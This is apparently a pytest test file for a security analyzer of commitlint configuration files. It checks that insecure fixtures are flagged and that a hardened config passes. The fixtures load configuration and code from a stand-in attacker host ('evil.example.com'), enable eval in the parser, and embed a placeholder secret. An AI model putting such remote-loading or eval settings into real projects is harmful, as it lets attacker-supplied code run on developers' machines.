"""Tests for CommitlintAnalyzer."""

from pathlib import Path

from devai.commitlint_analyzer import CommitlintAnalyzer, CommitlintFinding


INSECURE_COMMITLINTRC = """\
{
  "extends": ["http://evil.example.com/commitlint-config-evil"],
  "api_key": "sk-live-hardcoded-secret-token-12345",
  "rules": {
    "type-enum": [2, "always", ["feat", "fix"]]
  }
}
"""

INSECURE_JS_CONFIG = """\
// commitlint.config.js
module.exports = {
  extends: [require("http://evil.example.com/config.js")],
  parserPreset: { parserOpts: { eval: true } },
  process_env: process.env.API_SECRET_TOKEN
};
"""

HARDENED_COMMITLINTRC = """\
{
  "extends": ["@commitlint/config-conventional"],
  "rules": {
    "subject-max-length": [2, "always", 72]
  }
}
"""


class TestCommitlintAnalyzer:
    def test_detects_insecure_commitlintrc(self, tmp_path: Path):
        (tmp_path / ".commitlintrc.json").write_text(INSECURE_COMMITLINTRC, encoding="utf-8")
        analyzer = CommitlintAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "insecure_http" in kinds
        assert "hardcoded_secret" in kinds
        assert analyzer.stats.high_severity >= 1

    def test_detects_insecure_js_config(self, tmp_path: Path):
        (tmp_path / "commitlint.config.js").write_text(INSECURE_JS_CONFIG, encoding="utf-8")
        analyzer = CommitlintAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "insecure_http" in kinds or "insecure_extends" in kinds
        assert "secret_env_reference" in kinds
        assert "eval_parser" in kinds

    def test_detects_package_json_commitlint_config(self, tmp_path: Path):
        pkg = """\
{
  "name": "demo",
  "commitlint": {
    "extends": ["http://insecure.example.com/config.js"]
  }
}
"""
        (tmp_path / "package.json").write_text(pkg, encoding="utf-8")
        analyzer = CommitlintAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "insecure_http" in kinds

    def test_hardened_config_passes(self, tmp_path: Path):
        (tmp_path / ".commitlintrc.json").write_text(HARDENED_COMMITLINTRC, encoding="utf-8")
        analyzer = CommitlintAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert high == []
        assert analyzer.health_score() == 100.0

    def test_no_configs_returns_full_score(self, tmp_path: Path):
        analyzer = CommitlintAnalyzer(str(tmp_path))
        assert analyzer.health_score() == 100.0
        assert analyzer.summary() == "Commitlint: no config files found"

    def test_generate_hardened_template(self):
        config = CommitlintAnalyzer(".").generate_hardened_template()
        assert "@commitlint/config-conventional" in config
        assert "subject-max-length" in config

    def test_to_context_includes_findings(self, tmp_path: Path):
        (tmp_path / ".commitlintrc.json").write_text(INSECURE_COMMITLINTRC, encoding="utf-8")
        analyzer = CommitlintAnalyzer(str(tmp_path))
        context = analyzer.to_context()
        assert "Commitlint configuration analysis:" in context
        assert "insecure" in context.lower() or "hardcoded" in context.lower()

    def test_finding_format(self):
        finding = CommitlintFinding(
            kind="test",
            severity="high",
            message="test message",
            path=".commitlintrc.json",
            lineno=1,
        )
        assert "[high]" in finding.format()
        assert ".commitlintrc.json:1" in finding.format()
